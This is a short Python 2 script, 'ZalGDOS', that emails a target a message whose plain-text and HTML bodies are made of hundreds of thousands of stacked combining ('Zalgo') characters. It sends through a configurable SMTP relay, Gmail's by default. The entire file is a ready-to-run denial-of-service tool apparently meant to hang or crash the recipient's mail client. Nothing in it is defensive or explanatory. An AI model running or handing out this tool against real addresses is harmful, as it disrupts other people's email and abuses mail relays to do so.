#!/usr/bin/env python
# -*- coding: utf-8 -*-
# ZalGDOS by ShotokanZH

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import base64
import argparse

DEFAULT_BYTES = 600000
DEFAULT_SMTP = "smtp-relay.gmail.com"
DEFAULT_PORT = 25
DEFAULT_SUBJECT = "Hello"

parser = argparse.ArgumentParser()
parser.add_argument("FROM",help="Email address of the sender",type=str,metavar="FROM")
parser.add_argument("TO",help="Email address of the receiver",type=str,metavar="TO")
parser.add_argument("--subject","-j",help="Subject of the email (default: %s)" % (DEFAULT_SUBJECT),type=str,metavar="SUBJECT",default=DEFAULT_SUBJECT)
parser.add_argument("--bytes","-b",help="Payload bytes (default: %d)" % (DEFAULT_BYTES),type=int,metavar="BYTES",default=DEFAULT_BYTES)
parser.add_argument("--smtp","-S",help="SMTP Server (default: %s)" % (DEFAULT_SMTP),type=str,metavar="SMTP",default=DEFAULT_SMTP)
parser.add_argument("--port","-P",help="SMTP Port (default: %d)" % (DEFAULT_PORT),type=int,metavar="PORT",default=DEFAULT_PORT)
parser.add_argument("--user","-s",help="SMTP Username",type=str,metavar="USER",default=None)
parser.add_argument("--passwd","-p",help="SMTP Password",type=str,metavar="PASS",default=None)
args = parser.parse_args()

if args.bytes <=0:
    parser.error("BYTES must be > 0!")

if args.user or args.passwd:
    if not args.user or not args.passwd:
        parser.error("Username & password are required together!")

email_from = args.FROM
email_to = args.TO

clip = ""+unichr(857)*args.bytes

lclip = len(clip)

print "Payload: %d B == %.2f KB == %.3f MB" % (lclip,float(lclip)/1024,float(lclip)/1024/1024)

server = smtplib.SMTP(args.smtp, args.port)
if args.user and args.passwd:
    server.login(args.user, args.passwd)

print "Preparing Email..."
msg = MIMEMultipart('alternative')
subject = "=?utf-8?b?%s?=" % (base64.b64encode(clip.encode('utf-8')))   #default "integrated" base64 encoding sucks
msg['Subject'] = args.subject
msg['From'] = email_from
msg['To'] = email_to
msg.attach(MIMEText(clip.encode('utf-8'), 'plain', 'UTF-8'))
msg.attach(MIMEText(clip.encode('utf-8'), 'html', 'UTF-8'))

lmsg = len(msg.as_string())
print "Email size: %d B == %.2f KB == %.3f MB" % (lmsg,float(lmsg)/1024,float(lmsg)/1024/1024)

print "Sending Email..."
try:
    server.sendmail(email_from, email_to, msg.as_string())
    print "Email sent!"
except Exception, e:
    print "Error while sending the email!!"
    print "Error: %s" % (e)
    exit(1)
